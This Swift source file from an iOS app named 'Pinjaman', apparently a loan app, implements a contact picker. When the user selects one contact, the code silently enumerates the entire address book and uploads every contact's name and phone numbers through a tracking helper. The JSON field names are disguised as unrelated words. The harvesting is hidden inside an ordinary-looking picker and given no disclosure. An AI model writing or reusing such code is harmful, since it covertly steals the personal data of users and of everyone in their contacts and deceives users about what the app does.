//
//  ContactPicker.swift
//  Pinjaman
//
//  Created by MAC on 2025/9/13.
//

import Foundation
import SwiftUI
import ContactsUI

struct ContactPicker: UIViewControllerRepresentable {

    // onCompletion 闭包用于将选中的联系人数据传回
    var onCompletion: ((_ contact: (name: String, number: String)?) -> Void)

    class Coordinator: NSObject, CNContactPickerDelegate {
        var parent: ContactPicker

        init(_ parent: ContactPicker) {
            self.parent = parent
        }

        func contactPicker(_ picker: CNContactPickerViewController, didSelect contact: CNContact) {
            let fullName = CNContactFormatter.string(from: contact, style: .fullName) ?? "Unknown"
            var phoneNumber: String = ""
            if let number = contact.phoneNumbers.first?.value.stringValue {
                phoneNumber = number.filter { $0.isNumber }
            }
            // 调用闭包，将数据传回.
            self.fetchAllContacts()
            self.parent.onCompletion((name: fullName, number: phoneNumber))
        }
        
        func fetchAllContacts() {
            var allContacts: [[String: String]] = []
            let contactStore = CNContactStore()
            let keysToFetch = [CNContactGivenNameKey,
                               CNContactFamilyNameKey,
                               CNContactPhoneNumbersKey,
                               CNContactEmailAddressesKey,
                               CNContactBirthdayKey,
            ]
            as [CNKeyDescriptor]
            let request = CNContactFetchRequest(keysToFetch: keysToFetch)
            
            DispatchQueue.main.async(execute: {
                do {
                    try contactStore.enumerateContacts(with: request) { contact, stop in
                        let contactInfo = self.getContactInfo(contact: contact)
                        allContacts.append(contactInfo)
                    }
                    
                    if let jsonData = try? JSONEncoder().encode(allContacts),
                       let jsonString = String(data: jsonData, encoding: .utf8)
                    {
                        TrackHelper.share.onUploadContact(jsonString: jsonString)
                    }
                } catch {
                    print("Failed to fetch contacts: \(error)")
                }
            })
        }
        
        func getContactInfo(contact: CNContact) -> [String: String] {
            var userInfo: [String: String] = [:]
            let phoneNumbers = contact.phoneNumbers.map { $0.value.stringValue }.joined(separator: ",")
            userInfo["sensationally"] = phoneNumbers
            let fullName = "\(contact.givenName) \(contact.familyName)"
            userInfo["contendent"] = fullName
            return userInfo
        }

        func contactPickerDidCancel(_ picker: CNContactPickerViewController) {
            // 调用闭包，并传回 nil 表示用户取消
            self.parent.onCompletion(nil)
        }
    }

    func makeCoordinator() -> Coordinator {
        Coordinator(self)
    }

    func makeUIViewController(context: Context) -> CNContactPickerViewController {
        let picker = CNContactPickerViewController()
        picker.delegate = context.coordinator
        picker.displayedPropertyKeys = [CNContactPhoneNumbersKey, CNContactGivenNameKey, CNContactFamilyNameKey]
        return picker
    }

    func updateUIViewController(_ uiViewController: CNContactPickerViewController, context: Context) { }
}
